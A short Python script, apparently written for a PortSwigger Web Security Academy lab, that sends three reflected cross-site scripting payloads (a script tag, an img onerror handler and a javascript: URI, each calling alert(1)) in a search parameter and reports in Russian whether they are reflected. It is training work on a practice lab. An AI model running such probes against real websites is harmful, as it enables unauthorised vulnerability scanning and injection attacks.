import requests

url = "https://0a2e00b8049b288580da03a80024001f.web-security-academy.net/"

pyload = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)"
]

for payloads in pyload:

    test_skript = {"search": payloads }

    res = requests.get(url, params=test_skript)

    if payloads in res.text:
        print(f"вот скрипт {payloads}")
    else:
        print("ответ не отразился")
if res.status_code == 200:
    print("сайт работает")
else:
    print("проблема с url")